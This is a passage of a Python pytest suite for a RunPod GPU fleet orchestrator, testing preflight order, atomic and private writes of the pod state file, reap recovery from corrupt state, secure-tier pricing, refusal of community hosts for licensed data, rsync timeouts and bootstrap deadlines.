    def test_allow_stale_is_an_explicit_opt_in(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Comparing a stale result against its own recorded inputs stays legal."""
        from scripts.phase1b import runpod_parallel as rpp

        stale = dict(self._current())
        stale["all_controls_sha256"] = "0" * 64
        d = self._results_dir(tmp_path, [stale])

        rpp._assert_results_are_current(d, allow_stale=True)

    def test_the_refusal_names_which_input_moved(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """"Stale" with no field name sends the reader to go looking."""
        from scripts.phase1b import runpod_parallel as rpp

        stale = dict(self._current())
        stale["all_controls_sha256"] = "0" * 64
        d = self._results_dir(tmp_path, [stale])

        with pytest.raises(RuntimeError, match="all_controls_sha256"):
            rpp._assert_results_are_current(d, allow_stale=False)


class TestPreflightOrderIsPinned:
    """Preflight order is a decision, so it gets a test rather than a comment.

    The corpus gate was first on its first commit. On a developer machine with
    the licensed overlay staged that looks fine, because the check passes and
    the ordering never shows. On a fresh clone it raised before the
    stack-pin preflight could, so an untested sentence-transformers pin
    surfaced as a corpus error. CI caught it; a local run never could.

    Order is stack, corpus, tracking: cheapest local check, then a
    multi-megabyte hash, then a network round trip. All three run before
    anything billable is created.
    """

    def test_provision_runs_the_preflights_in_order(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from scripts.phase1b import runpod_parallel as rpp

        calls: list[str] = []

        def _stop(*args: object, **kwargs: object) -> object:
            raise AssertionError("provision reached a billable step")

        monkeypatch.setattr(rpp, "_preflight_training_stack",
                            lambda: calls.append("stack"))
        monkeypatch.setattr(rpp, "_preflight_corpus",
                            lambda: calls.append("corpus"))
        monkeypatch.setattr(rpp, "_preflight_tracking",
                            lambda: calls.append("tracking"))
        # provision prunes the known-hosts file between the preflights and the
        # first billable call; point it at a scratch path so a unit test never
        # deletes the operator's real one.
        monkeypatch.setattr(rpp, "KNOWN_HOSTS_FILE", tmp_path / "kh")
        monkeypatch.setattr(rpp, "select_pod_configs", _stop)
        monkeypatch.setattr(rpp, "rank_available_gpus", _stop)
        monkeypatch.setattr(rpp, "create_pods_parallel", _stop)
        monkeypatch.setattr(rpp, "_save_pod_state", _stop)

        with pytest.raises(AssertionError, match="billable"):
            rpp.provision()

        assert calls == ["stack", "corpus", "tracking"]


class TestPodStateIsWrittenAtomically:
    """The state file is the only local record of which pods are billing.

    `write_text` truncates in place, so a crash, a full disk or a killed
    orchestrator mid-write leaves a file that exists and does not parse. Every
    reader of it dies on that JSONDecodeError: teardown, reap, and the
    scheduled reaper guard that is the last bound on spend once the
    orchestrator is gone. The moment the record is most needed is precisely the
    moment it can be half-written.
    """

    def _saved(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path,
    ) -> tuple[object, Path]:
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        monkeypatch.setattr(rp, "POD_STATE_FILE", state_file)
        return rp, state_file

    def test_the_write_goes_through_the_atomic_helper(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from tract.io import atomic_write_json

        rp, state_file = self._saved(monkeypatch, tmp_path)
        seen: list[tuple[object, Path]] = []

        def _spy(data: object, path: object) -> None:
            seen.append((data, Path(str(path))))
            atomic_write_json(data, Path(str(path)))

        monkeypatch.setattr(rp, "atomic_write_json", _spy)
        rp._save_pod_state([{"pod_id": "p1"}], meta={"state": "running"})

        assert len(seen) == 1
        payload, path = seen[0]
        assert path == state_file
        assert payload == {"pods": [{"pod_id": "p1"}], "meta": {"state": "running"}}

    def test_a_failed_write_leaves_the_previous_record_intact(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """A full disk must not cost the list of pods that are billing."""
        import tract.io as tio

        rp, state_file = self._saved(monkeypatch, tmp_path)
        rp._save_pod_state(
            [{"pod_id": "p1", "name": "tract-p1b-fold0"}], meta={"state": "running"},
        )

        def _no_space(*args: object, **kwargs: object) -> None:
            raise OSError(28, "No space left on device")

        monkeypatch.setattr(tio.json, "dump", _no_space)
        with pytest.raises(OSError):
            rp._save_pod_state([{"pod_id": "p2"}], meta={"state": "running"})

        kept = json.loads(state_file.read_text(encoding="utf-8"))
        assert [p["pod_id"] for p in kept["pods"]] == ["p1"]
        assert [p.name for p in tmp_path.iterdir()] == [".pod_state.json"], (
            "a partial write must not be left lying beside the record"
        )

    def test_the_record_is_not_readable_by_other_local_accounts(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """It holds every pod's live IP and SSH port."""
        rp, state_file = self._saved(monkeypatch, tmp_path)
        rp._save_pod_state([{"pod_id": "p1", "ip": "203.0.113.7", "port": 22041}])

        assert state_file.stat().st_mode & 0o777 == 0o600

    def test_a_rewrite_does_not_widen_the_mode(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """os.replace() carries the temp file's mode across, not the target's."""
        rp, state_file = self._saved(monkeypatch, tmp_path)
        rp._save_pod_state([{"pod_id": "p1"}])
        rp._save_pod_state([{"pod_id": "p1"}, {"pod_id": "p2"}])

        assert state_file.stat().st_mode & 0o777 == 0o600
        assert len(json.loads(state_file.read_text(encoding="utf-8"))["pods"]) == 2

    def test_a_world_readable_state_file_is_refused(self, tmp_path: Path) -> None:
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text("{}", encoding="utf-8")
        state_file.chmod(0o644)

        with pytest.raises(RuntimeError, match="0o644"):
            rp._assert_pod_state_is_private(state_file)

    def test_the_atomic_temp_file_is_never_shipped_to_a_pod(self) -> None:
        """`.pod_state.json` is excluded because it names every pod's address.

        atomic_write_json writes `..pod_state.json.<rand>.tmp` beside it, which
        the existing exclude does not match, and a killed orchestrator leaves
        that temp behind. The corrupt sidecar reap keeps is the same class.
        """
        source = Path("scripts/phase1b/runpod_parallel.py").read_text(
            encoding="utf-8"
        )
        excludes = source.split("excludes = ")[1].split("))")[0]
        assert '"*.tmp"' in excludes
        assert '".pod_state.json.*"' in excludes


class TestReapSurvivesACorruptStateFile:
    """`reap` is the one recovery command, and a truncated file killed it.

    reap catches FileNotFoundError to reach its name sweep -- the sweep exists
    because the situation that strands pods is exactly the one where the state
    file is gone or stale. A file that exists and does not parse is the same
    situation wearing a different exception, and it went straight through the
    handler as a JSONDecodeError. The reaper guard calls reap(confirm=True),
    so that traceback also removes the only automatic bound on a fleet whose
    orchestrator has died.
    """

    def _reap(
        self,
        monkeypatch: pytest.MonkeyPatch,
        tmp_path: Path,
        body: str | None,
        running: tuple[dict[str, str], ...] = (),
    ) -> tuple[object, Path, list[list[str]]]:
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        if body is not None:
            state_file.write_text(body, encoding="utf-8")
        monkeypatch.setattr(rp, "POD_STATE_FILE", state_file)
        monkeypatch.setattr(rp, "get_running_pods", lambda: list(running))
        killed: list[list[str]] = []
        monkeypatch.setattr(
            rp, "terminate_pods", lambda ids: killed.append(sorted(ids)) or [],
        )
        return rp, state_file, killed

    TRUNCATED = '{"pods": [{"pod_id": "p1", "ip": "203.0.113.7", "por'
    ORPHAN = ({"id": "orphan-1", "name": "tract-p1b-fold0"},)

    def test_a_truncated_state_file_still_sweeps_by_name(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        rp, _, killed = self._reap(
            monkeypatch, tmp_path, self.TRUNCATED, self.ORPHAN,
        )

        rp.reap(confirm=True)

        assert killed == [["orphan-1"]]

    def test_a_state_file_of_the_wrong_shape_also_sweeps(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Valid JSON that is not a pod-state object is equally unusable."""
        rp, _, killed = self._reap(
            monkeypatch, tmp_path, '"provisioning"', self.ORPHAN,
        )

        rp.reap(confirm=True)

        assert killed == [["orphan-1"]]

    def test_the_corrupt_case_is_logged_distinctly_from_the_missing_one(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        rp, state_file, _ = self._reap(
            monkeypatch, tmp_path, self.TRUNCATED, self.ORPHAN,
        )

        with caplog.at_level("ERROR"):
            rp.reap(confirm=True)

        assert "did not parse" in caplog.text
        assert str(state_file) in caplog.text

    def test_the_missing_case_still_says_so(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        rp, _, killed = self._reap(monkeypatch, tmp_path, None, self.ORPHAN)

        with caplog.at_level("WARNING"):
            rp.reap(confirm=True)

        assert "No state file" in caplog.text
        assert "did not parse" not in caplog.text
        assert killed == [["orphan-1"]]

    def test_the_corrupt_bytes_are_kept_for_inspection(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """reap unlinks the state file when it finishes.

        The corrupt bytes may still name a pod the name sweep cannot see, so
        deleting them would destroy the only remaining record of it.
        """
        rp, state_file, _ = self._reap(
            monkeypatch, tmp_path, self.TRUNCATED, self.ORPHAN,
        )

        rp.reap(confirm=True)

        kept = state_file.with_name(state_file.name + ".corrupt")
        assert kept.read_text(encoding="utf-8") == self.TRUNCATED
        assert not state_file.exists()

    def test_a_corrupt_file_with_nothing_running_reaps_nothing(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Degrading must not invent targets, only survive the parse."""
        rp, _, killed = self._reap(monkeypatch, tmp_path, self.TRUNCATED, ())

        rp.reap(confirm=True)

        assert killed == []

    def test_teardown_still_refuses_a_corrupt_state_file(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """The widening is scoped to the recovery command.

        teardown terminates pods by id, and the ids are what the corrupt file
        lost. Guessing there would be a silent partial teardown; reap is the
        command that knows how to work without them.
        """
        rp, _, _ = self._reap(monkeypatch, tmp_path, self.TRUNCATED)

        with pytest.raises(json.JSONDecodeError):
            rp.teardown()


class TestBudgetPricesTheTierTheFleetLandsOn:
    """The budget priced the cheapest tier; provisioning prefers the dearest.

    get_gpu_price asked for the cross-cloud lowest price while create_pod asks
    for SECURE first. Measured live on 2026-08-26: $2.69/hr unfiltered against
    $3.29/hr with secureCloud:true, so every budget number understated the
    fleet by 22.3%.
    """

    def _captured_input(self, monkeypatch: pytest.MonkeyPatch) -> dict[str, object]:
        from scripts.phase0 import runpod_provision as rpp

        seen: dict[str, object] = {}

        def _gql(query: str, variables: dict[str, object] | None = None) -> dict:
            seen.update(variables or {})
            return {"gpuTypes": [{"lowestPrice": {"uninterruptablePrice": 3.29}}]}

        monkeypatch.setattr(rpp, "_gql", _gql)
        assert rpp.get_gpu_price("NVIDIA H100 80GB HBM3", gpu_count=2) == 3.29
        gpu_input = seen["input"]
        assert isinstance(gpu_input, dict)
        return gpu_input

    def test_the_price_query_asks_for_the_secure_tier(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        assert self._captured_input(monkeypatch)["secureCloud"] is True

    def test_the_gpu_count_still_reaches_the_query(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The tier filter is added to the input, not swapped in for it."""
        assert self._captured_input(monkeypatch)["gpuCount"] == 2

    def test_the_priced_tier_is_the_tier_create_pod_prefers(self) -> None:
        """One constant drives both, so they cannot drift apart again."""
        from scripts.phase0 import runpod_provision as rpp

        assert rpp.CLOUD_TYPE_PREFERENCE[0] == rpp.CLOUD_TYPE_SECURE
        assert rpp.PRICE_CLOUD_TYPE == rpp.CLOUD_TYPE_PREFERENCE[0]


class TestTheRecordShowsWhereEachFoldRan:
    """create_pod falls back SECURE -> COMMUNITY without saying so.

    _rsync_to ships data/processed/licensed to whichever host answered, so the
    tier a fold landed on is a fact about where licensed corpus went, not a
    curiosity.
    """

    def _api(
        self, monkeypatch: pytest.MonkeyPatch, accepts: str,
    ) -> list[str]:
        from scripts.phase0 import runpod_provision as rpp

        asked: list[str] = []

        class _Resp:
            def __init__(self, payload: object) -> None:
                self._payload = payload

            def json(self) -> object:
                return self._payload

        def _post(
            url: str, headers: object = None, json: dict | None = None,
            timeout: int = 0,
        ) -> _Resp:
            cloud = (json or {})["cloudType"]
            asked.append(cloud)
            if cloud != accepts:
                return _Resp({"error": "no instances currently available"})
            return _Resp({"id": "pod-1"})

        # _headers() shells out to `pass`; nothing here may touch the store.
        monkeypatch.setattr(rpp, "_headers", lambda: {})
        monkeypatch.setattr(rpp.requests, "post", _post)
        monkeypatch.setattr(
            rpp, "_wait_for_ssh",
            lambda pod_id: {"ip": "203.0.113.7", "port": 22041},
        )
        return asked

    def test_a_pod_on_the_preferred_tier_records_it(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_provision as rpp

        asked = self._api(monkeypatch, accepts="SECURE")
        pod = rpp.create_pod("NVIDIA H100 80GB HBM3", name="tract-p1b-fold0")

        assert asked == ["SECURE"]
        assert pod["cloud_type"] == "SECURE"

    @pytest.mark.usefixtures("_public_corpus")
    def test_a_silent_fallback_to_community_is_recorded(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_provision as rpp

        asked = self._api(monkeypatch, accepts="COMMUNITY")
        pod = rpp.create_pod("NVIDIA H100 80GB HBM3", name="tract-p1b-fold0")

        assert asked == ["SECURE", "COMMUNITY"]
        assert pod["cloud_type"] == "COMMUNITY"

    def test_the_tier_is_persisted_and_a_fallback_is_called_out(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        from scripts.phase1b import runpod_parallel as rpp

        pods = [
            {"pod_id": "a", "role": "MITRE ATLAS", "ip": "203.0.113.7",
             "port": 22041, "cloud_type": "SECURE"},
            {"pod_id": "b", "role": "NIST AI 100-2", "ip": "203.0.113.8",
             "port": 22042, "cloud_type": "COMMUNITY"},
        ]
        saved: list[list[dict[str, object]]] = []

        monkeypatch.setattr(rpp, "_preflight_training_stack", lambda: None)
        monkeypatch.setattr(rpp, "_preflight_corpus", lambda: "d" * 64)
        monkeypatch.setattr(rpp, "_preflight_tracking", lambda: None)
        monkeypatch.setattr(rpp, "KNOWN_HOSTS_FILE", tmp_path / "kh")
        monkeypatch.setattr(
            rpp, "rank_available_gpus",
            lambda **kwargs: [("NVIDIA H100 80GB HBM3", 3.29)],
        )
        monkeypatch.setattr(rpp, "get_gpu_price", lambda *a, **k: 3.29)
        monkeypatch.setattr(rpp, "create_pods_parallel", lambda *a, **k: pods)
        monkeypatch.setattr(
            rpp, "_save_pod_state",
            lambda p, meta=None: saved.append(p),
        )

        # With the licensed overlay staged this is now REFUSED rather than
        # warned about: _rsync_to would put ISO 27001 and ETSI prose on a
        # third-party host, and a warning emitted after the pods exist cannot
        # prevent that. The pods are still recorded so `teardown` can find them.
        monkeypatch.setenv("TRACT_RUNPOD_ALLOW_COMMUNITY", "")
        if rpp._require_secure_cloud():
            with pytest.raises(RuntimeError, match="licensed corpus is staged"):
                rpp.provision(folds=["MITRE ATLAS", "NIST AI 100-2"])
            assert saved[-1] == pods, (
                "the fleet must be recorded before the refusal, or teardown "
                "has nothing to terminate"
            )
            return

        # Public-corpus checkout: the tier still has to be recorded and called
        # out, because the budget was priced on SECURE.
        with caplog.at_level("WARNING"):
            got = rpp.provision(folds=["MITRE ATLAS", "NIST AI 100-2"])

        assert [p["cloud_type"] for p in got] == ["SECURE", "COMMUNITY"]
        # provision records intent first, then the fleet it actually created.
        assert saved[-1] == pods
        assert "NIST AI 100-2" in caplog.text

    def test_the_override_downgrades_the_refusal_to_a_warning(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        """The licensing call belongs to the owner, and must be recordable."""
        from scripts.phase1b import runpod_parallel as rpp

        pods = [
            {"pod_id": "a", "role": "MITRE ATLAS", "ip": "203.0.113.7",
             "port": 22041, "cloud_type": "COMMUNITY"},
        ]
        monkeypatch.setenv("TRACT_RUNPOD_ALLOW_COMMUNITY", "1")
        monkeypatch.setattr(rpp, "_preflight_training_stack", lambda: None)
        monkeypatch.setattr(rpp, "_preflight_corpus", lambda: "d" * 64)
        monkeypatch.setattr(rpp, "_preflight_tracking", lambda: None)
        monkeypatch.setattr(rpp, "KNOWN_HOSTS_FILE", tmp_path / "kh")
        monkeypatch.setattr(
            rpp, "rank_available_gpus",
            lambda **kwargs: [("NVIDIA H100 80GB HBM3", 3.29)],
        )
        monkeypatch.setattr(rpp, "get_gpu_price", lambda *a, **k: 3.29)
        monkeypatch.setattr(rpp, "create_pods_parallel", lambda *a, **k: pods)
        monkeypatch.setattr(rpp, "_save_pod_state", lambda p, meta=None: None)

        with caplog.at_level("WARNING"):
            got = rpp.provision(folds=["MITRE ATLAS"])
        assert [p["cloud_type"] for p in got] == ["COMMUNITY"]
        assert "licensing decision" in caplog.text


class TestKnownHostsIsFreshEveryRound:
    """A stale host key is a hard bootstrap abort on a billing fleet.

    The file accumulates across rounds and nothing prunes it. Thirty pod-runs
    drawn from one IP and port pool eventually reuse an endpoint whose key has
    changed, ssh answers "Host key verification failed", and
    _is_transient_ssh_failure refuses to retry that on purpose -- correctly,
    because it is a configuration error rather than a blip. On a fresh fleet it
    is a false positive with no legitimate prior key behind it.
    """

    def _provision_up_to_the_first_billable_step(
        self, monkeypatch: pytest.MonkeyPatch, known_hosts: Path
    ) -> object:
        from scripts.phase1b import runpod_parallel as rpp

        def _stop(*args: object, **kwargs: object) -> object:
            raise AssertionError("provision reached a billable step")

        monkeypatch.setattr(rpp, "_preflight_training_stack", lambda: None)
        monkeypatch.setattr(rpp, "_preflight_corpus", lambda: "d" * 64)
        monkeypatch.setattr(rpp, "_preflight_tracking", lambda: None)
        monkeypatch.setattr(rpp, "KNOWN_HOSTS_FILE", known_hosts)
        monkeypatch.setattr(rpp, "select_pod_configs", _stop)
        return rpp

    def test_provision_prunes_the_accumulated_host_keys(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        known_hosts = tmp_path / ".runpod_known_hosts"
        known_hosts.write_text(
            "[203.0.113.7]:22041 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI\n",
            encoding="utf-8",
        )
        rpp = self._provision_up_to_the_first_billable_step(monkeypatch, known_hosts)

        with pytest.raises(AssertionError, match="billable"):
            rpp.provision()

        assert not known_hosts.exists()

    def test_a_first_run_with_no_host_keys_is_not_an_error(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        known_hosts = tmp_path / ".runpod_known_hosts"
        rpp = self._provision_up_to_the_first_billable_step(monkeypatch, known_hosts)

        with pytest.raises(AssertionError, match="billable"):
            rpp.provision()

        assert not known_hosts.exists()

    def test_the_pruning_happens_before_any_pod_exists(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Pruning after the fleet is up would delete the keys just accepted."""
        from scripts.phase1b import runpod_parallel as rpp

        known_hosts = tmp_path / ".runpod_known_hosts"
        known_hosts.write_text("stale\n", encoding="utf-8")
        order: list[str] = []

        monkeypatch.setattr(rpp, "_preflight_training_stack", lambda: None)
        monkeypatch.setattr(rpp, "_preflight_corpus", lambda: "d" * 64)
        monkeypatch.setattr(rpp, "_preflight_tracking", lambda: None)
        monkeypatch.setattr(rpp, "KNOWN_HOSTS_FILE", known_hosts)

        def _configs(*args: object, **kwargs: object) -> list[dict[str, str]]:
            order.append("known_hosts_gone" if not known_hosts.exists() else "stale")
            raise AssertionError("provision reached a billable step")

        monkeypatch.setattr(rpp, "select_pod_configs", _configs)

        with pytest.raises(AssertionError, match="billable"):
            rpp.provision()

        assert order == ["known_hosts_gone"]


class TestReapSweepCoversBothSplits:
    """reap's name fallback was blind to every validation pod.

    The sweep exists for the window where .pod_state.json records pods=[] --
    between "intent to provision" and "all pods up" -- which is exactly where a
    crash during provisioning lands. It matched POD_CONFIGS, built from the TEST
    roster, so it saw tract-p1b-fold0..4 and never tract-p1b-val-fold0..4.

    Found the hard way on 2026-08-27: a capacity error killed fold0 while four
    validation pods billed, the operator interrupted inside that window, and
    teardown said "nothing scoped to terminate" while the fallback swept past
    all four. They were terminated by hand.
    """

    def test_the_sweep_names_cover_every_pod_either_split_can_create(self) -> None:
        from scripts.phase1b.runpod_parallel import select_pod_configs

        swept = {
            config["name"]
            for split in ("test", "validation")
            for config in select_pod_configs(None, split)
        }
        for split in ("test", "validation"):
            for config in select_pod_configs(None, split):
                assert config["name"] in swept, (
                    f"{config['name']} ({split}) is creatable but unreachable "
                    f"by reap's name fallback"
                )

    def test_pod_configs_alone_would_still_miss_the_validation_fleet(self) -> None:
        """The regression itself, asserted so it cannot quietly return."""
        from scripts.phase1b.runpod_parallel import POD_CONFIGS, select_pod_configs

        test_only = {c["name"] for c in POD_CONFIGS}
        validation = {c["name"] for c in select_pod_configs(None, "validation")}
        assert validation, "validation split creates no pods -- test is vacuous"
        assert not (validation & test_only), (
            "the two splits now share names; this test's premise is stale"
        )


class _FakeClock:
    """A monotonic clock the test drives, so deadline arithmetic is exact.

    Substituted for the `time` module in the orchestrator's namespace rather
    than patched onto the real one: these tests assert on second-precise
    clamping, and a real clock makes the expected value a range.
    """

    def __init__(self, now: float = 1000.0) -> None:
        self.now = now

    def monotonic(self) -> float:
        return self.now

    def time(self) -> float:
        return self.now

    def sleep(self, seconds: float) -> None:
        # Backoff sleeps spend the bootstrap deadline like any other wait,
        # which is the whole reason they are modelled here.
        self.now += seconds


class TestRsyncPushCarriesTheIdleTimer:
    """The 20 characters that cost 90 minutes and the last of four fleets.

    `--timeout` is rsync's I/O-idle timer, not a wall clock: it fires when no
    bytes move for that long. The PULL has carried it since the collect path
    was written; the PUSH never did, so a stalled-but-alive transfer was bounded
    only by the 1800s process wall, three times over. On 2026-08-27 a pod sat
    with 82MB present and moved ZERO bytes in a sampled 45-second window while
    that ran, and the fleet's bootstrap barrier held for 90 minutes before
    `if bootstrap_errors: raise` aborted the campaign without launching a fold.
    """

    def _push(self, monkeypatch: pytest.MonkeyPatch, **kwargs: Any) -> tuple[str, dict]:
        from scripts.phase1b import runpod_parallel as rp

        seen: dict[str, Any] = {}

        def _run(cmd: str, **kw: Any) -> None:
            seen["cmd"], seen["kwargs"] = cmd, kw

        monkeypatch.setattr(rp.subprocess, "run", _run)
        rp._rsync_to("1.2.3.4", 22, "/local/", "/remote/", **kwargs)
        return seen["cmd"], seen["kwargs"]

    def _pull(self, monkeypatch: pytest.MonkeyPatch) -> tuple[str, dict]:
        from scripts.phase1b import runpod_parallel as rp

        seen: dict[str, Any] = {}

        def _run(cmd: str, **kw: Any) -> None:
            seen["cmd"], seen["kwargs"] = cmd, kw

        monkeypatch.setattr(rp.subprocess, "run", _run)
        rp._rsync_from("1.2.3.4", 22, "/remote/", "/local/")
        return seen["cmd"], seen["kwargs"]

    def test_the_push_command_declares_the_idle_timeout(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        cmd, _ = self._push(monkeypatch)
        assert f"--timeout={rp.RSYNC_IDLE_TIMEOUT_S}" in cmd

    def test_the_push_command_resumes_a_partial_transfer(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Without --partial the idle timer throws away everything it had."""
        cmd, _ = self._push(monkeypatch)
        assert "--partial" in cmd

    def test_the_push_and_the_pull_agree_on_the_idle_timer(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        push, _ = self._push(monkeypatch)
        pull, _ = self._pull(monkeypatch)
        flag = f"--timeout={rp.RSYNC_IDLE_TIMEOUT_S}"
        assert flag in push and flag in pull

    def test_the_push_is_walled_by_the_push_timeout(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        _, kwargs = self._push(monkeypatch)
        assert kwargs["timeout"] == rp.RSYNC_PUSH_TIMEOUT_S

    def test_the_pull_keeps_the_longer_wall(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Results run to gigabytes; that justification is the pull's alone."""
        from scripts.phase1b import runpod_parallel as rp

        _, kwargs = self._pull(monkeypatch)
        assert kwargs["timeout"] == rp.RSYNC_PULL_TIMEOUT_S

    def test_the_push_wall_is_sized_for_the_measured_payload(self) -> None:
        """61,327,794 bytes over 560 files, measured with this exclude list."""
        from scripts.phase1b import runpod_parallel as rp

        assert rp.RSYNC_PUSH_TIMEOUT_S == 300
        assert rp.RSYNC_PUSH_ATTEMPTS == 2
        assert rp.RSYNC_PULL_TIMEOUT_S == 1800
        assert rp.RSYNC_PULL_ATTEMPTS == 3
        # 61.3MB / 300s is a 200 KB/s floor. The pull's 1800s wall on the same
        # payload would tolerate 34 KB/s, some 250x slower than a healthy link.
        assert rp.RSYNC_PUSH_TIMEOUT_S < rp.RSYNC_PULL_TIMEOUT_S
        assert rp.PUSH_PAYLOAD_BYTES / rp.RSYNC_PUSH_TIMEOUT_S == pytest.approx(
            204_425.98, abs=1.0
        )

    def test_the_push_stops_after_two_attempts(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Three 30-minute attempts is what 90 minutes of wedge was made of."""
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        calls = {"n": 0}

        def _run(cmd: str, **kwargs: Any) -> None:
            calls["n"] += 1
            raise sp.CalledProcessError(255, cmd)

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)

        with pytest.raises(sp.CalledProcessError):
            rp._rsync_to("1.2.3.4", 22, "/local/", "/remote/")
        assert calls["n"] == rp.RSYNC_PUSH_ATTEMPTS


class TestBootstrapDeadlineIsCooperative:
    """A grace timer cannot free a wedged bootstrap; a clamp can.

    The premortem proved the abandon-the-future approach fails: `with
    ThreadPoolExecutor` joins the wedged thread on the way out, cancel()
    succeeds on none of the pods because max_workers == len(pods) so every
    future is already running, and shutdown(wait=False, cancel_futures=True)
    still hangs the interpreter at atexit. The only mechanism that ends a
    wedged bootstrap is the wedged thread ending itself, so every step is
    clamped to what remains of an absolute deadline and the step past it
    raises instead of blocking.
    """

    def _clock(self, monkeypatch: pytest.MonkeyPatch) -> _FakeClock:
        from scripts.phase1b import runpod_parallel as rp

        clock = _FakeClock()
        monkeypatch.setattr(rp, "time", clock)
        return clock

    def test_a_step_gets_its_full_timeout_when_the_deadline_is_far(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        clock = self._clock(monkeypatch)
        assert rp._clamp_to_deadline(
            clock.now + 10_000, rp.SSH_BOOTSTRAP_TIMEOUT_S, "pip install",
        ) == rp.SSH_BOOTSTRAP_TIMEOUT_S

    def test_a_step_is_clamped_to_what_remains(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        clock = self._clock(monkeypatch)
        assert rp._clamp_to_deadline(
            clock.now + 120, rp.SSH_BOOTSTRAP_TIMEOUT_S, "pip install",
        ) == 120

    def test_a_step_never_gets_less_than_a_second(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """int() truncation must not turn 0.4s left into a zero-second step."""
        from scripts.phase1b import runpod_parallel as rp

        clock = self._clock(monkeypatch)
        assert rp._clamp_to_deadline(
            clock.now + 0.4, rp.SSH_BOOTSTRAP_TIMEOUT_S, "pip install",
        ) == 1

    def test_an_expired_deadline_raises_instead_of_starting_the_step(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        clock = self._clock(monkeypatch)
        with pytest.raises(TimeoutError, match="bootstrap deadline"):
            rp._clamp_to_deadline(
                clock.now - 1, rp.SSH_BOOTSTRAP_TIMEOUT_S, "cuda probe",
            )

    def test_ssh_clamps_every_retry_attempt_not_only_the_first(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The retry ladder is where an unclamped deadline leaks 4x its budget."""
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        clock = _FakeClock()
        granted: list[int] = []

        def _run(*args: Any, **kwargs: Any) -> None:
            granted.append(kwargs["timeout"])
            clock.now += kwargs["timeout"]
            raise sp.TimeoutExpired(cmd="ssh", timeout=kwargs["timeout"])

        monkeypatch.setattr(rp, "time", clock)
        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        deadline = clock.now + rp.BOOTSTRAP_DEADLINE_S
        with pytest.raises(TimeoutError, match="bootstrap deadline"):
            rp._ssh("1.2.3.4", 22, "true",
                    timeout=rp.SSH_BOOTSTRAP_TIMEOUT_S, deadline=deadline)

        # 900 hung, 15s backoff, then only 585 of the 1500 remained.
        assert granted == [900, 585]
        overshoot = clock.now - deadline
        assert 0 <= overshoot <= rp.BOOTSTRAP_DEADLINE_SLACK_S

    def test_every_step_of_one_pod_shares_one_deadline(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        clock = _FakeClock()
        deadlines: list[float] = []

        def _ssh(ip, port, cmd, check=True, env=None, timeout=0, deadline=None):
            deadlines.append(deadline)

            class _R:
                returncode, stdout, stderr = 0, "", ""

            return _R()

        def _rsync(ip, port, local, remote, deadline=None):
            deadlines.append(deadline)

        monkeypatch.setattr(rp, "time", clock)
        monkeypatch.setattr(rp, "_ssh", _ssh)
        monkeypatch.setattr(rp, "_rsync_to", _rsync)

        rp._bootstrap_pod(
            {"ip": "1.2.3.4", "port": 22, "role": "MITRE ATLAS"},
            base_model="BAAI/bge-large-en-v1.5", env={},
        )

